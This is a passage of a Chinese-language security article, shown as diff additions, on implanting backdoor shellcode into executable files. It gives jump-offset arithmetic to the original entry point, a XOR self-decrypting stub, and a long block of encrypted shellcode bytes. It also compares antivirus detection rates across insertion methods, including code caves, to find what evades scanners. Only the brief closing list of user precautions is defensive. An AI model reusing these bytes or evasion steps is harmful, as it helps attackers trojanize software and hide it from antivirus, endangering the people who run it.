+
+原OEP=9486
+
+当前地址=0x38000(新OEP)+后门Shellcode大小(0x141)+7(恢复Shellcode中E9 99 99 99
+99前面的字节数)=0x38148
+
+故偏移=0x9486-0x38148-5=0xFFFD1339
+
+修改完毕后，不要忘记给这段跳转到原OEP的shellcode加密。在这里我们使用异或方式简单的加密一下。然后在前面添加b)中的自解密shellcode：
+
+60 E8 00 00 00 00 58 8D 70 19 33 C9 66 B9 78 01
+
+8A 04 0E 34 02 88 04 0E E2 F6 80 34 0E 02 61
+
+其中0x178为Shellcode的大小-1，02为解密key
+
+注意：因为跳转到原OEP的shellcode后要添加上面这段自解密shellcode，所以跳转偏移需要再减去解密shellcode的大小0x1f，最终偏移为0xFFFD131A.加密后的恢复shellcode如下：
+
+60 E8 00 00 00 00 58 8D 70 19 33 C9 66 B9 78 01
+
+8A 04 0E 34 02 88 04 0E E2 F6 80 34 0E 02 61 62
+
+EA 0D 02 02 02 63 EB 18 11 FF FD 84 96 02 02 57
+
+89 EE 68 FD 57 89 EE 81 EE 2E 54 55 C4 47 D6 69
+
+C4 47 D7 67 C4 47 D4 70 C4 47 D5 6C C4 47 DA 67
+
+C4 47 DB 6E C4 47 D8 31 C4 47 D9 30 C4 47 DE 2C
+
+C4 47 DF 66 C4 47 DC 6E C4 47 DD 6E C4 47 E2 02
+
+81 67 FA 02 81 67 FE 02 81 67 F6 02 66 89 37 32
+
+02 02 02 89 44 0A 89 74 0E 89 74 1E 89 34 89 74
+
+0A 8B 77 FA EA 02 02 02 02 5C 01 44 90 8B 47 FE
+
+81 EC 68 8B 77 F6 89 57 FA BB 85 30 DA C2 EA 6F
+
+02 02 02 8B 47 EA 68 02 68 02 8F 47 D6 52 FD 57
+
+EA 8B 47 E6 89 57 E6 BB 1C A6 66 ED EA 4D 02 02
+
+02 8B 47 EE 8F 47 F2 52 68 42 68 07 FD 77 FE FD
+
+57 EE 89 7F FE 89 77 F6 FE BB 07 02 02 02 F1 A6
+
+8F 47 F2 52 FD 77 F2 68 07 FD 77 FE FD 57 EE 5D
+
+5C 89 E7 5F C1 54 31 F4 E9 0B C3 CC 05 0D BC C2
+
+01 F2 43 88 03 86 C2 77 F3 39 D4 5C 0D 96 C2 C1
+
+57 89 EE 81 EE 12 51 54 55 89 F8 8B 4F FE 31 F4
+
+89 45 3E 89 46 3A 7A 01 C5 89 4A 1E 89 52 22 01
+
+CD 89 5A 1A 01 D5 8B 4F F2 89 4A 26 01 CD 8B 57
+
+FA 8B 4F F6 87 D9 76 22 89 0E B0 89 57 FE 01 CD
+
+EA A2 FD FD FD 86 C2 77 1F 8F 41 FD 39 F2 76 10
+
+89 57 FA 44 39 F1 70 E2 89 47 F2 5D 5C 59 89 E7
+
+5F C1 31 C2 E9 F7 89 47 F6 89 4F F2 0D B5 06 72
+
+89 06 83 01 C5 E9 E6
+
+把该Shellcode拼接到c)中的shellcode后，注意把原Shellcode后面的5个字节JMP OEP删除，完成程序能正常运行。继续病毒检测：
+
+![image.png](https://image.3001.net/images/20180608/1528426137534.png!small)
+
+结果发现报毒率反而变高了，和OEP设置在shellcode段相比，我们没有改变OEP的值，而是改变OEP处的跳转，那么是不是OEP跨段跳转会是一个异常检测点呢，又或是我们后来添加的这段跳转回原OEP的shellcode呢。因为我们的恢复shellcode是加密的，所以和之前相比不应该报毒率变高才对，所以它出问题的概率应该不高。因此，我们把OEP处的跳转给它还原成原来的值，相当于只是附加了shellcode，但是什么都不做，再检测一遍。
+
+![image.png](https://image.3001.net/images/20180608/15284261456285.png!small)
+
+报毒率又降低了，说明我们不改变OEP的值，更改OEP处的跳转作用不大。但这步检测让我们知道：更改OEP处的代码比把OEP设置在shellcode段更容易被检测到、OEP在正常段不容易被检测到。
+
+区段添加的shellcode的免杀率我们已经有所了解，下面我们看下代码洞的表现。
+
+e) 代码洞添加的shellcode：
+
+![image.png](https://image.3001.net/images/20180608/15284261523430.png!small)
+
+这就能看出来代码洞添加shellcode的强大之处了。但是通过第三章我们也发现，代码洞添加shellcode需要特殊文件特殊对待，不容易自动化。
+
+## 六、总结
+
+在现有的工具中插马、植入后门非常容易，那么应该如何防范呢？
+
+> a) 首先是提高安全意识，不要随意从网上下载执行软件、下载最好去官方网站下载
+>
+> b) 下载后检查文件的数字签名是否有效且为官方数字签名。
+>
+> c)
+> 及时安装安全软件，虽然大部分恶意代码发布时都具备免杀功能，但是随着病毒库的升级，对于恶意代码检测能力也在不断提高，所以及时安装、升级安全软件是自我保护的一个重要方法。
+
